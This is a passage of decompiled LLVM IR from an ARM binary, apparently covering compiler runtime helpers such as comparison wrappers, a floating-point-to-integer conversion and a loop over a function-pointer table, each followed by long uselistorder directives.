  uselistorder i32* @ip, { 9, 10, 11, 12, 13, 14, 15, 3, 16, 17, 4, 18, 19, 20, 21, 22, 23, 24, 8, 25, 26, 27, 28, 29, 30, 31, 32, 39, 40, 5, 41, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 33, 34, 0, 35, 36, 37, 38, 50, 51, 7, 52, 6, 53, 101, 44, 45, 2, 46, 47, 43, 48, 105, 102, 103, 104, 1, 106, 42, 49, 54, 55, 56, 57, 58 }
  uselistorder label %dec_label_pc_165f4, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %..thread7_crit_edge, { 1, 0, 2 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_16594, { 1, 0, 2 }
}

define i32 @function_165fc() local_unnamed_addr {
dec_label_pc_165fc:
  %v0_165fc = load i32, i32* @r0, align 4
  %v0_16600 = load i32, i32* @r2, align 4
  store i32 %v0_16600, i32* @r0, align 4
  store i32 %v0_165fc, i32* @r2, align 4
  %v0_16608 = load i32, i32* @r1, align 4
  %v0_1660c = load i32, i32* @r3, align 4
  store i32 %v0_1660c, i32* @r1, align 4
  store i32 %v0_16608, i32* @r3, align 4
  %v0_16614 = call i32 @function_16618()
  ret i32 %v0_16614

; uselistorder directives
  uselistorder i32* @r3, { 4, 5, 6, 7, 1, 8, 9, 10, 0, 11, 2, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 3, 30, 33, 31, 32, 35, 36, 29, 34, 28 }
  uselistorder i32* @r1, { 21, 22, 28, 29, 14, 30, 31, 32, 33, 34, 35, 36, 11, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 23, 24, 50, 51, 25, 0, 3, 52, 10, 53, 54, 55, 56, 57, 58, 59, 60, 61, 9, 62, 63, 64, 65, 66, 67, 13, 68, 69, 70, 71, 72, 73, 74, 153, 75, 157, 4, 143, 144, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 6, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 5, 219, 220, 76, 77, 78, 79, 80, 119, 120, 121, 122, 123, 81, 82, 83, 84, 85, 86, 87, 88, 89, 12, 18, 19, 20, 221, 2, 222, 90, 91, 160, 124, 154, 224, 161, 166, 167, 170, 168, 169, 162, 163, 164, 165, 223, 92, 15, 158, 126, 125, 225, 226, 227, 93, 94, 95, 16, 96, 97, 98, 99, 100, 101, 7, 8, 102, 103, 104, 105, 106, 1, 107, 108, 109, 17, 26, 27, 171, 110, 111, 112, 113, 114, 115, 116, 117, 118, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 145, 146, 147, 148, 149, 150, 151, 152, 155, 156, 159, 172 }
  uselistorder i32* @r2, { 17, 18, 22, 23, 24, 11, 25, 26, 27, 28, 29, 30, 31, 32, 33, 96, 7, 97, 34, 98, 99, 12, 8, 146, 147, 148, 149, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 2, 46, 47, 48, 49, 50, 51, 52, 53, 9, 54, 13, 14, 15, 150, 3, 151, 156, 157, 161, 132, 152, 134, 138, 139, 142, 140, 141, 135, 136, 137, 130, 158, 19, 100, 55, 56, 57, 101, 1, 159, 5, 160, 58, 6, 59, 60, 61, 63, 64, 65, 66, 67, 68, 69, 10, 70, 71, 4, 72, 0, 73, 62, 20, 16, 21, 153, 154, 155, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 131, 133, 143, 144, 145 }
}

define i32 @function_16618() local_unnamed_addr {
dec_label_pc_16618:
  %stack_var_-8 = alloca i32, align 4
  %v3_16618 = load i32, i32* @r0, align 4
  store i32 %v3_16618, i32* %stack_var_-8, align 4
  %v0_1661c = call i32 @function_16578()
  store i1 true, i1* @cpsr_c, align 1
  %v1_16620 = icmp slt i32 %v0_1661c, 0
  %v2_16620 = icmp eq i32 %v0_1661c, 0
  store i1 %v2_16620, i1* @cpsr_z, align 1
  br i1 %v1_16620, label %bb, label %bb3

bb:                                               ; preds = %dec_label_pc_16618
  store i1 false, i1* @cpsr_c, align 1
  store i1 false, i1* @cpsr_z, align 1
  br label %bb3

bb3:                                              ; preds = %dec_label_pc_16618, %bb
  %v2_16628 = load i32, i32* %stack_var_-8, align 4
  ret i32 %v2_16628

; uselistorder directives
  uselistorder i32 ()* @function_16578, { 3, 2, 1, 0 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @function_1662c() local_unnamed_addr {
dec_label_pc_1662c:
  %stack_var_-8 = alloca i32, align 4
  %v0_1662c = load i32, i32* @lr, align 4
  store i32 %v0_1662c, i32* %stack_var_-8, align 4
  %v0_16630 = call i32 @function_16618()
  %v0_16634 = load i1, i1* @cpsr_z, align 1
  %.v0_16630. = zext i1 %v0_16634 to i32
  store i32 %.v0_16630., i32* @r0, align 4
  call void @__pseudo_branch(i32 %v0_1662c)
  %v0_16640 = load i32, i32* @lr, align 4
  store i32 %v0_16640, i32* %stack_var_-8, align 4
  %v0_16644 = call i32 @function_16618()
  %v0_16648 = load i1, i1* @cpsr_c, align 1
  %tmp2 = zext i1 %v0_16648 to i32
  %.v0_16644. = xor i32 %tmp2, 1
  store i32 %.v0_16644., i32* @r0, align 4
  call void @__pseudo_branch(i32 %v0_16640)
  %v0_16654 = load i32, i32* @lr, align 4
  store i32 %v0_16654, i32* %stack_var_-8, align 4
  %v0_16658 = call i32 @function_16618()
  %v0_1665c = load i1, i1* @cpsr_z, align 1
  %v1_1665c = load i1, i1* @cpsr_c, align 1
  %v2_1665c = xor i1 %v1_1665c, true
  %v3_1665c = or i1 %v0_1665c, %v2_1665c
  %.v0_16658 = select i1 %v3_1665c, i32 1, i32 %v0_16658
  %v2_16660 = xor i1 %v0_1665c, true
  %v3_16660 = and i1 %v1_1665c, %v2_16660
  %..v0_16658 = select i1 %v3_16660, i32 0, i32 %.v0_16658
  store i32 %..v0_16658, i32* @r0, align 4
  %v2_16664 = load i32, i32* %stack_var_-8, align 4
  call void @__pseudo_branch(i32 %v2_16664)
  %v0_16668 = load i32, i32* @lr, align 4
  store i32 %v0_16668, i32* %stack_var_-8, align 4
  %v0_1666c = call i32 @function_165fc()
  %v0_16670 = load i1, i1* @cpsr_z, align 1
  %v1_16670 = load i1, i1* @cpsr_c, align 1
  %v2_16670 = xor i1 %v1_16670, true
  %v3_16670 = or i1 %v0_16670, %v2_16670
  %.v0_1666c = select i1 %v3_16670, i32 1, i32 %v0_1666c
  %v2_16674 = xor i1 %v0_16670, true
  %v3_16674 = and i1 %v1_16670, %v2_16674
  %..v0_1666c = select i1 %v3_16674, i32 0, i32 %.v0_1666c
  store i32 %..v0_1666c, i32* @r0, align 4
  %v2_16678 = load i32, i32* %stack_var_-8, align 4
  call void @__pseudo_branch(i32 %v2_16678)
  %v0_1667c = load i32, i32* @lr, align 4
  store i32 %v0_1667c, i32* %stack_var_-8, align 4
  %v0_16680 = call i32 @function_165fc()
  %v0_16684 = load i1, i1* @cpsr_c, align 1
  %tmp3 = zext i1 %v0_16684 to i32
  %.v0_16680. = xor i32 %tmp3, 1
  call void @__pseudo_branch(i32 %v0_1667c)
  ret i32 %.v0_16680.

; uselistorder directives
  uselistorder i1 %v1_16670, { 1, 0 }
  uselistorder i1 %v1_1665c, { 1, 0 }
  uselistorder i32 ()* @function_165fc, { 1, 0 }
  uselistorder i1 true, { 1, 2, 3, 4, 55, 0, 5, 6, 7, 8, 46, 47, 51, 48, 49, 50, 52, 9, 10, 11, 56, 53, 14, 15, 16, 17, 12, 13, 54, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 31, 32, 29, 30, 57, 58, 59, 60, 33, 34, 35, 44, 36, 37, 38, 39, 45, 40, 41, 42, 43 }
  uselistorder i1 false, { 32, 37, 9, 10, 76, 77, 78, 79, 80, 81, 82, 83, 84, 38, 12, 39, 40, 41, 11, 42, 43, 44, 45, 46, 47, 48, 49, 50, 36, 13, 51, 24, 14, 25, 52, 53, 54, 16, 15, 7, 8, 55, 56, 57, 1, 2, 58, 26, 27, 59, 28, 29, 17, 33, 34, 4, 18, 60, 30, 31, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 35, 85, 0, 21, 20, 22, 19, 5, 6, 23, 3, 86, 87, 88, 89 }
  uselistorder i1* @cpsr_z, { 2, 3, 4, 5, 6, 12, 13, 14, 15, 16, 17, 19, 20, 21, 22, 23, 24, 26, 27, 28, 29, 30, 31, 32, 0, 33, 1, 7, 8, 18, 9, 10, 11, 34, 25 }
  uselistorder i32 ()* @function_16618, { 2, 1, 0, 3 }
  uselistorder i32* @lr, { 7, 8, 9, 10, 11, 12, 19, 20, 21, 22, 23, 24, 25, 26, 27, 13, 14, 68, 65, 66, 67, 28, 29, 30, 31, 86, 33, 32, 0, 34, 35, 1, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 3, 107, 108, 109, 4, 110, 111, 112, 5, 113, 114, 115, 116, 117, 118, 119, 120, 36, 37, 38, 39, 40, 6, 42, 43, 41, 87, 88, 89, 121, 69, 70, 79, 80, 122, 123, 90, 91, 92, 124, 83, 84, 44, 45, 46, 47, 48, 85, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 2, 60, 49, 15, 16, 61, 62, 63, 64, 95, 81, 93, 17, 18, 94, 71, 72, 73, 74, 75, 76, 77, 78, 82, 96 }
}

define i32 @function_16690(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_16690:
  %v1_16690 = icmp slt i32 %arg1, 0
  %v2_16690 = mul i32 %arg1, 2
  br i1 %v1_16690, label %dec_label_pc_166c4, label %dec_label_pc_16698

dec_label_pc_16698:                               ; preds = %dec_label_pc_16690
  %v1_16698 = add i32 %v2_16690, 2097152
  %v2_16698 = icmp ugt i32 %v2_16690, -2097153
  br i1 %v2_16698, label %dec_label_pc_166cc, label %dec_label_pc_166a0

dec_label_pc_166a0:                               ; preds = %dec_label_pc_16698
  %v6_16698 = icmp slt i32 %v1_16698, 0
  br i1 %v6_16698, label %dec_label_pc_166a4, label %dec_label_pc_166c4

dec_label_pc_166a4:                               ; preds = %dec_label_pc_166a0
  %v4_166a8 = sdiv i32 %v1_16698, 2097152
  %v5_166a8 = sub nsw i32 -993, %v4_166a8
  %v11_166a8 = icmp slt i32 %v5_166a8, 0
  br i1 %v11_166a8, label %dec_label_pc_166d4, label %dec_label_pc_166b0

dec_label_pc_166b0:                               ; preds = %dec_label_pc_166a4
  %v3_166b0 = mul i32 %arg1, 2048
  %v4_166b8 = udiv i32 %arg2, 2097152
  %v1_166b4 = or i32 %v3_166b0, %v4_166b8
  %v5_166b8 = or i32 %v1_166b4, -2147483648
  %v6_166bc = lshr i32 %v5_166b8, %v5_166a8
  ret i32 %v6_166bc

dec_label_pc_166c4:                               ; preds = %dec_label_pc_166a0, %dec_label_pc_16690
  ret i32 0

dec_label_pc_166cc:                               ; preds = %dec_label_pc_16698
  %v4_166cc = mul i32 %arg1, 4096
  %v5_166cc = or i32 %v4_166cc, %arg2
  %v7_166cc = icmp eq i32 %v5_166cc, 0
  br i1 %v7_166cc, label %dec_label_pc_166d4, label %dec_label_pc_166dc

dec_label_pc_166d4:                               ; preds = %dec_label_pc_166cc, %dec_label_pc_166a4
  ret i32 -1

dec_label_pc_166dc:                               ; preds = %dec_label_pc_166cc
  ret i32 0

; uselistorder directives
  uselistorder i32 4096, { 0, 1, 2, 3, 4, 20, 5, 6, 21, 7, 8, 9, 10, 22, 12, 13, 14, 15, 16, 23, 17, 24, 18, 25, 11, 19 }
  uselistorder i32 -2147483648, { 0, 6, 1, 7, 8, 9, 10, 11, 12, 14, 13, 3, 5, 15, 16, 17, 18, 19, 4, 2, 20, 21, 22, 23 }
  uselistorder i32 2048, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 8 }
  uselistorder i32 2097152, { 8, 9, 15, 0, 1, 2, 10, 11, 3, 4, 5, 12, 13, 14, 6, 7 }
  uselistorder i32 2, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 141, 35, 36, 37, 138, 38, 39, 40, 41, 42, 73, 142, 143, 43, 133, 74, 173, 174, 92, 175, 176, 77, 177, 76, 178, 75, 144, 71, 145, 146, 44, 45, 147, 148, 102, 103, 149, 104, 150, 105, 151, 46, 134, 89, 140, 47, 179, 90, 139, 106, 78, 80, 79, 81, 82, 83, 84, 94, 85, 95, 86, 87, 72, 152, 153, 100, 48, 49, 50, 135, 51, 101, 154, 96, 93, 52, 155, 156, 157, 53, 136, 0, 54, 55, 56, 57, 58, 59, 60, 61, 62, 137, 63, 64, 65, 66, 67, 107, 91, 158, 108, 109, 110, 111, 112, 113, 68, 114, 115, 69, 97, 159, 160, 116, 117, 98, 118, 119, 120, 121, 125, 161, 124, 162, 163, 122, 123, 164, 132, 126, 165, 127, 166, 167, 168, 128, 169, 129, 130, 131, 170, 99, 171, 70, 172, 88 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @function_166e4(i32 %arg1) local_unnamed_addr {
dec_label_pc_166e4:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_166e8 = load i32, i32* @global_var_201fc.365, align 4
  %v7_166ec = icmp eq i32 %v3_166e8, -1
  %v3_166f0 = load i32, i32* @r4, align 4
  store i32 %v3_166f0, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_201fc.365 to i32), i32* %r4.global-to-local, align 4
  br i1 %v7_166ec, label %bb, label %.preheader

bb:                                               ; preds = %dec_label_pc_166e4
  store i32 %v3_166f0, i32* %r4.global-to-local, align 4
  ret i32 %arg1

.preheader:                                       ; preds = %dec_label_pc_166e4, %.preheader
  %v0_16700 = phi i32 [ %v3_16704, %.preheader ], [ %v3_166e8, %dec_label_pc_166e4 ]
  call void @__pseudo_branch(i32 %v0_16700)
  %v0_16704 = load i32, i32* %r4.global-to-local, align 4
  %v1_16704 = add i32 %v0_16704, -4
  %v2_16704 = inttoptr i32 %v1_16704 to i32*
  %v3_16704 = load i32, i32* %v2_16704, align 4
  store i32 %v1_16704, i32* %r4.global-to-local, align 4
  %v3_16708 = icmp eq i32 %v3_16704, -1
  br i1 %v3_16708, label %dec_label_pc_16710, label %.preheader

dec_label_pc_16710:                               ; preds = %.preheader
  %v2_16710 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16710, i32* %r4.global-to-local, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v3_16704, { 1, 0 }
  uselistorder i32 %v3_166e8, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32 -4, { 60, 30, 31, 51, 32, 33, 61, 62, 63, 16, 34, 35, 36, 64, 65, 66, 17, 37, 38, 39, 67, 68, 69, 18, 40, 41, 70, 29, 28, 71, 72, 73, 27, 26, 25, 24, 42, 43, 44, 45, 46, 13, 47, 14, 48, 15, 74, 23, 49, 52, 0, 56, 57, 58, 59, 20, 19, 53, 54, 55, 22, 21, 1, 50, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 2 }
  uselistorder i32 -1, { 150, 0, 1, 35, 225, 151, 38, 39, 36, 37, 152, 40, 41, 42, 43, 44, 149, 153, 154, 155, 2, 156, 157, 3, 4, 158, 226, 45, 68, 227, 159, 160, 228, 229, 69, 230, 161, 66, 46, 162, 231, 5, 47, 163, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 164, 148, 48, 62, 232, 165, 166, 233, 234, 67, 63, 64, 235, 236, 237, 238, 239, 117, 70, 240, 147, 129, 60, 59, 167, 241, 242, 266, 267, 168, 130, 268, 6, 243, 169, 170, 244, 245, 131, 71, 281, 72, 287, 73, 246, 74, 307, 75, 308, 76, 309, 77, 310, 78, 282, 79, 223, 80, 311, 7, 8, 171, 9, 247, 81, 248, 249, 172, 173, 174, 269, 270, 132, 10, 224, 61, 175, 176, 133, 177, 11, 12, 58, 49, 50, 178, 179, 180, 57, 250, 181, 251, 13, 14, 82, 274, 83, 271, 84, 272, 85, 288, 86, 278, 87, 276, 88, 265, 89, 277, 90, 182, 252, 146, 183, 184, 91, 185, 186, 187, 188, 189, 190, 51, 52, 145, 253, 92, 254, 191, 255, 256, 192, 134, 257, 53, 258, 259, 135, 15, 193, 194, 113, 118, 116, 16, 119, 19, 17, 18, 120, 136, 260, 261, 195, 93, 262, 20, 21, 94, 289, 95, 273, 96, 312, 313, 97, 263, 98, 279, 99, 280, 100, 283, 101, 314, 102, 290, 103, 317, 104, 284, 105, 291, 106, 275, 107, 285, 108, 286, 109, 264, 110, 315, 65, 316, 54, 55, 196, 197, 198, 199, 200, 201, 114, 111, 137, 202, 203, 204, 26, 27, 28, 22, 23, 24, 25, 205, 206, 207, 208, 209, 138, 139, 210, 211, 212, 29, 56, 30, 31, 112, 140, 141, 32, 115, 213, 214, 126, 127, 128, 33, 215, 121, 122, 123, 124, 125, 34, 216, 217, 218, 219, 220, 221, 222, 142, 143, 144 }
  uselistorder i32* @global_var_201fc.365, { 1, 0 }
  uselistorder i32 1, { 421, 130, 329, 341, 342, 330, 422, 423, 680, 681, 682, 424, 193, 195, 194, 196, 197, 199, 198, 683, 89, 684, 426, 425, 186, 187, 188, 189, 185, 190, 184, 220, 219, 221, 305, 685, 686, 83, 687, 248, 247, 249, 427, 258, 259, 257, 828, 270, 829, 176, 814, 815, 816, 290, 32, 291, 349, 688, 428, 28, 26, 25, 29, 27, 689, 690, 430, 429, 251, 252, 254, 253, 255, 283, 325, 908, 909, 910, 911, 912, 306, 431, 204, 817, 818, 819, 432, 230, 231, 229, 228, 691, 292, 692, 952, 293, 953, 954, 955, 956, 957, 958, 959, 960, 961, 962, 963, 964, 435, 434, 433, 213, 214, 215, 216, 211, 209, 210, 212, 218, 217, 296, 307, 693, 350, 694, 695, 351, 281, 308, 278, 294, 295, 696, 352, 697, 698, 699, 700, 309, 701, 271, 702, 703, 353, 704, 705, 706, 449, 448, 447, 446, 445, 444, 443, 442, 441, 440, 439, 438, 437, 413, 436, 101, 100, 114, 105, 103, 102, 110, 106, 109, 107, 108, 104, 113, 111, 112, 796, 797, 414, 450, 46, 44, 49, 51, 47, 48, 43, 45, 50, 707, 708, 709, 710, 279, 711, 712, 713, 451, 119, 120, 117, 121, 118, 714, 715, 452, 136, 716, 717, 718, 719, 720, 93, 91, 90, 94, 95, 96, 92, 721, 454, 453, 62, 60, 61, 63, 310, 333, 457, 456, 455, 458, 250, 459, 191, 192, 460, 64, 461, 222, 462, 131, 463, 224, 464, 208, 465, 223, 466, 74, 467, 88, 468, 0, 472, 471, 470, 469, 98, 97, 354, 473, 311, 355, 474, 135, 475, 87, 722, 480, 479, 478, 477, 476, 162, 163, 166, 165, 164, 923, 924, 483, 482, 481, 182, 356, 484, 284, 798, 280, 799, 312, 485, 76, 81, 75, 78, 77, 80, 82, 79, 285, 670, 486, 33, 35, 36, 34, 37, 830, 313, 831, 314, 832, 488, 487, 39, 40, 38, 41, 42, 489, 154, 150, 156, 152, 151, 153, 155, 334, 490, 357, 492, 491, 965, 315, 495, 494, 493, 235, 234, 496, 20, 21, 19, 22, 497, 174, 175, 173, 172, 498, 181, 180, 316, 927, 499, 84, 85, 358, 359, 282, 503, 502, 501, 500, 141, 140, 297, 504, 170, 505, 202, 506, 99, 507, 171, 508, 158, 509, 72, 510, 73, 511, 54, 512, 800, 801, 206, 514, 513, 226, 227, 225, 966, 515, 723, 724, 516, 207, 897, 898, 899, 900, 901, 902, 903, 298, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 124, 122, 123, 125, 126, 904, 274, 179, 178, 177, 299, 905, 945, 946, 821, 820, 671, 672, 673, 674, 675, 676, 677, 970, 58, 59, 56, 57, 744, 71, 360, 517, 361, 745, 746, 747, 748, 518, 415, 266, 263, 264, 267, 265, 326, 749, 363, 750, 751, 317, 318, 752, 753, 364, 754, 756, 757, 758, 365, 760, 319, 761, 759, 362, 762, 366, 763, 327, 764, 765, 755, 522, 521, 520, 519, 6, 10, 8, 11, 15, 7, 14, 12, 13, 16, 9, 766, 523, 236, 241, 237, 239, 240, 238, 524, 169, 168, 767, 768, 769, 525, 17, 18, 328, 286, 771, 287, 772, 320, 773, 774, 776, 275, 777, 367, 778, 288, 775, 321, 533, 532, 531, 530, 529, 528, 527, 526, 65, 67, 68, 69, 66, 368, 300, 534, 142, 143, 144, 770, 335, 416, 536, 535, 537, 160, 369, 678, 679, 538, 243, 242, 244, 967, 336, 968, 969, 539, 233, 232, 540, 301, 542, 541, 913, 543, 5, 544, 23, 545, 52, 53, 546, 256, 547, 134, 548, 183, 549, 115, 24, 550, 138, 161, 551, 128, 552, 205, 553, 554, 203, 555, 137, 556, 167, 557, 70, 246, 139, 337, 877, 878, 338, 933, 934, 272, 935, 779, 276, 289, 780, 781, 782, 273, 373, 783, 784, 785, 786, 374, 787, 788, 789, 371, 372, 790, 331, 375, 370, 791, 563, 562, 561, 560, 559, 558, 792, 793, 570, 569, 568, 567, 566, 417, 565, 564, 376, 794, 795, 572, 571, 802, 803, 377, 378, 573, 804, 805, 381, 806, 379, 807, 808, 380, 809, 382, 268, 580, 579, 578, 577, 576, 575, 574, 129, 810, 383, 811, 812, 384, 813, 385, 269, 588, 587, 586, 585, 584, 583, 582, 581, 127, 822, 823, 824, 825, 826, 827, 386, 593, 592, 591, 590, 589, 132, 133, 833, 834, 835, 836, 387, 837, 838, 839, 600, 599, 598, 597, 596, 595, 594, 200, 201, 872, 840, 841, 842, 843, 844, 845, 846, 847, 390, 848, 849, 850, 851, 852, 853, 389, 854, 855, 856, 857, 858, 859, 860, 861, 862, 863, 388, 864, 865, 866, 392, 867, 868, 391, 869, 870, 871, 669, 873, 874, 608, 607, 606, 605, 604, 603, 602, 601, 145, 148, 149, 147, 146, 343, 875, 610, 609, 30, 31, 612, 611, 1, 393, 876, 323, 613, 615, 614, 339, 879, 394, 395, 881, 880, 396, 618, 617, 616, 344, 882, 883, 397, 398, 399, 884, 418, 885, 400, 619, 340, 401, 402, 886, 403, 887, 626, 625, 624, 623, 622, 621, 620, 322, 888, 889, 890, 404, 277, 891, 892, 893, 405, 894, 630, 629, 628, 627, 419, 895, 632, 631, 159, 896, 633, 406, 906, 636, 635, 634, 907, 420, 55, 346, 914, 915, 345, 916, 917, 347, 348, 918, 919, 637, 920, 2, 3, 922, 921, 407, 408, 641, 640, 639, 638, 409, 925, 926, 643, 642, 647, 646, 645, 644, 650, 649, 648, 652, 651, 928, 929, 410, 930, 931, 324, 932, 655, 654, 653, 332, 4, 659, 658, 657, 656, 303, 936, 937, 938, 302, 939, 940, 941, 411, 661, 660, 412, 942, 943, 944, 663, 662, 116, 947, 948, 665, 664, 86, 304, 949, 950, 666, 245, 951, 157, 667, 668, 262, 261, 260 }
  uselistorder label %.preheader, { 1, 0 }
}

define i32 @function_16718() local_unnamed_addr {
dec_label_pc_16718:
  %v5_1671c = load i32, i32* @r0, align 4
  ret i32 %v5_1671c

; uselistorder directives
  uselistorder i32* @r0, { 9, 54, 55, 56, 57, 58, 59, 60, 69, 32, 70, 71, 11, 72, 73, 74, 75, 30, 61, 149, 150, 7, 76, 77, 178, 143, 144, 145, 146, 15, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 78, 79, 80, 45, 46, 81, 47, 48, 82, 83, 84, 49, 85, 86, 127, 128, 129, 130, 131, 87, 33, 88, 23, 39, 220, 221, 222, 40, 185, 223, 224, 50, 51, 52, 53, 14, 8, 17, 18, 89, 90, 43, 225, 226, 132, 24, 62, 63, 64, 10, 151, 152, 153, 154, 155, 156, 157, 169, 170, 228, 20, 21, 188, 22, 187, 227, 91, 36, 133, 25, 92, 93, 94, 95, 195, 44, 96, 35, 97, 98, 99, 3, 29, 100, 101, 4, 6, 0, 1, 102, 103, 5, 104, 105, 106, 27, 107, 108, 109, 2, 110, 111, 65, 112, 66, 67, 68, 230, 231, 113, 16, 229, 31, 41, 42, 28, 171, 19, 191, 34, 192, 193, 26, 114, 115, 116, 117, 118, 120, 119, 121, 122, 123, 124, 125, 126, 134, 135, 136, 137, 138, 139, 140, 141, 142, 147, 148, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 172, 173, 174, 175, 177, 176, 179, 180, 181, 182, 183, 184, 186, 189, 190, 194, 196, 13, 12, 37, 38 }
}

define i32 @function_16720() local_unnamed_addr {
entry:
  %v3_16724 = load i32, i32* @r4, align 4
  %v0_1672c = call i32 @function_80b0()
  call void @__pseudo_branch(i32 %v3_16724)
  ret i32 %v0_1672c

; uselistorder directives
  uselistorder void (i32)* @__pseudo_branch, { 0, 17, 2, 3, 4, 5, 6, 13, 8, 9, 22, 23, 19, 20, 10, 21, 7, 24, 11, 12, 14, 15, 16, 1, 18 }
  uselistorder i32 0, { 0, 641, 1, 642, 643, 587, 309, 310, 623, 624, 644, 645, 646, 647, 2, 648, 649, 650, 4, 5, 6, 651, 652, 3, 653, 654, 7, 655, 656, 36, 588, 657, 658, 659, 660, 661, 662, 663, 664, 95, 94, 165, 166, 167, 665, 666, 667, 668, 669, 670, 37, 671, 672, 673, 38, 39, 161, 674, 675, 676, 677, 40, 162, 319, 678, 679, 680, 681, 682, 683, 41, 684, 9, 8, 42, 589, 685, 606, 590, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 11, 625, 626, 627, 628, 320, 699, 700, 607, 10, 701, 702, 321, 629, 12, 630, 703, 704, 591, 13, 705, 706, 163, 164, 322, 15, 14, 707, 708, 709, 710, 711, 712, 713, 592, 593, 714, 608, 715, 716, 609, 610, 717, 718, 594, 719, 611, 720, 721, 722, 43, 1106, 1107, 1108, 1109, 1110, 116, 1111, 168, 1112, 1113, 1114, 1115, 1116, 1117, 1118, 169, 595, 612, 596, 597, 1119, 1120, 1121, 1122, 1123, 1124, 723, 724, 109, 63, 1079, 1080, 1081, 266, 725, 726, 727, 44, 728, 729, 132, 730, 731, 732, 170, 733, 734, 735, 736, 737, 738, 171, 16, 1239, 1240, 1241, 1242, 173, 172, 1243, 174, 1082, 1083, 17, 613, 739, 64, 133, 740, 741, 230, 18, 614, 232, 742, 65, 134, 743, 744, 231, 1327, 1328, 1329, 1330, 1333, 1334, 1335, 1336, 1337, 1338, 1339, 1340, 1331, 1332, 1341, 1342, 1343, 1344, 1345, 1346, 1347, 1348, 45, 1349, 1350, 1351, 1352, 46, 1353, 1354, 47, 1355, 1356, 48, 1357, 1358, 1359, 1360, 1361, 1362, 1363, 1364, 1365, 1366, 1367, 1368, 1369, 1370, 1373, 1374, 1375, 1376, 1377, 1378, 1379, 1380, 1371, 1372, 1381, 1382, 1383, 1384, 1385, 1386, 1387, 1388, 49, 1389, 1390, 1391, 1392, 50, 1393, 1394, 1395, 1396, 51, 1397, 1398, 1399, 1400, 1401, 1402, 1403, 1404, 1405, 1406, 1407, 1408, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 175, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 52, 776, 777, 778, 779, 780, 781, 782, 135, 111, 783, 784, 176, 177, 785, 786, 787, 788, 178, 789, 790, 791, 792, 793, 794, 795, 796, 797, 53, 798, 799, 800, 801, 802, 803, 804, 805, 806, 264, 807, 66, 179, 808, 136, 324, 809, 810, 811, 812, 813, 814, 54, 815, 816, 817, 818, 819, 820, 821, 325, 822, 823, 824, 825, 826, 326, 827, 828, 829, 830, 831, 272, 832, 833, 834, 323, 835, 836, 837, 838, 839, 271, 840, 841, 842, 843, 844, 845, 846, 847, 848, 180, 849, 850, 270, 851, 55, 852, 853, 854, 855, 856, 857, 858, 859, 327, 860, 861, 862, 863, 864, 865, 866, 867, 868, 869, 870, 871, 872, 1018, 1019, 1020, 1021, 615, 1022, 1023, 1024, 1025, 1026, 1027, 874, 873, 875, 876, 877, 878, 879, 880, 881, 882, 883, 884, 885, 886, 887, 888, 889, 137, 890, 891, 19, 892, 233, 893, 234, 894, 895, 138, 896, 1252, 1270, 1271, 1272, 1273, 897, 1409, 632, 1410, 1411, 1412, 1257, 631, 1413, 1258, 1414, 1415, 181, 1416, 114, 1417, 112, 113, 1418, 1419, 1420, 328, 329, 1424, 330, 1435, 1440, 586, 235, 1441, 331, 1439, 332, 333, 20, 1421, 1422, 182, 898, 273, 899, 336, 275, 274, 900, 901, 902, 903, 335, 904, 905, 334, 906, 1259, 183, 1423, 1028, 1029, 1030, 1031, 1032, 1033, 185, 139, 1034, 115, 184, 186, 337, 633, 140, 634, 141, 635, 187, 1125, 1126, 1127, 1128, 21, 1201, 1202, 339, 1425, 340, 276, 1426, 1427, 1429, 1430, 338, 1276, 1278, 1279, 67, 236, 1280, 1277, 